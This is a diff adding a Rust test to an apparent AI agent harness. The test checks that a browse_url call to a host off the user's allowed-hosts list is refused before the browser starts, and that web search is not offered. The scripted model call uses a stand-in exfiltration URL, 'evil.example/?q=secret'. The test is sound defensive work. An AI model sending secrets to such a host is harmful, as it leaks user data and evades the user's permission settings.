@@ -2495,6 +2495,48 @@ async fn refused_and_broken_calls_are_reported_without_running() {
     assert!(!h.project.parent().unwrap().join("outside.txt").exists());
 }
 
+/// With the allowed hosts on, a page on another host is refused before the
+/// browser starts, and web search isn't offered without its engine listed
+/// (docs/design/allowed-hosts-plan.md, J02).
+#[tokio::test]
+async fn a_page_off_the_allowed_hosts_is_refused_before_the_browser_starts() {
+    let h = harness(&[]).await;
+    let (url, seen) = model(vec![
+        Reply::Calls(vec![(
+            "c1",
+            "browse_url",
+            json!({ "url": "https://evil.example/?q=secret" }),
+        )]),
+        Reply::Text("I'll ask the user."),
+    ])
+    .await;
+    let listed = Permissions {
+        allow_any_host: false,
+        allowed_hosts: vec!["docs.rs".into()],
+        ..quiet_permissions()
+    };
+    h.start(h.request(&url, Harness::send("Read it"), listed))
+        .await;
+    assert_eq!(h.run_end().await, "done");
+    let messages = h.messages().await;
+    let c1 = &result_of(&messages, "c1").content;
+    assert!(
+        c1.starts_with(
+            "Error: blocked by the user's permission settings. evil.example isn't in the user's \
+             allowed hosts (docs.rs)"
+        ),
+        "{c1}"
+    );
+    let offered: Vec<String> = seen.lock().unwrap()[0]["tools"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|t| t["function"]["name"].as_str().unwrap().to_string())
+        .collect();
+    assert!(offered.contains(&"browse_url".to_string()), "{offered:?}");
+    assert!(!offered.contains(&"web_search".to_string()), "{offered:?}");
+}
+
 #[tokio::test]
 async fn arguments_that_arent_json_are_an_error_for_the_model() {
     let h = harness(&[]).await;
